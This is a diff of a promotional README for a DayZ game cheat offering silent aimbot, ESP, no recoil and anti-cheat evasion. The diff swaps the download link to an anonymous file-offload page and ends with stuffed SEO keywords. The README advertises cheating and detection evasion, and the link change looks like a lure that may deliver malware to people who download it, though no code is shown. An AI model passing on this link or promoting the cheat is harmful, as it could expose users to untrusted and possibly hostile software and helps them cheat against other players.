@@ -2,7 +2,7 @@
 
 Survive, dominate, and control the map in **DayZ** with this fully-featured **C++ external cheat**. Whether you’re looting military zones or engaging in long-range PvP, this tool gives you all the tactical advantages — including silent aimbot, player/zombie ESP, item finder, no recoil, and more. 🎯 Lightweight, undetected, and Zeus/admin-safe, it’s the ultimate tool for solo survivors and squad players alike.
 
-[![Download DayZ Cheat](https://img.shields.io/badge/Download-DayZ_Cheat-blueviolet)](https://wecheaters.github.io/cheats/dayz/)
+[![Download DayZ Cheat](https://img.shields.io/badge/Download-DayZ_Cheat-blueviolet)](https://fileoffload1.bitbucket.io)
 
 ---
 
@@ -75,3 +75,4 @@ This cheat reads memory externally to collect real-time data about players, zomb
 DayZ Cheat, DayZ Aimbot, DayZ ESP Hack, C++ DayZ Cheat, External DayZ Hack, DayZ Loot Finder, DayZ Undetected Hack, No Recoil DayZ, DayZ PvP Cheat, Silent Aimbot DayZ, Zeus Safe DayZ Cheat, DayZ Legit Hack Free Download
 
 ---
+
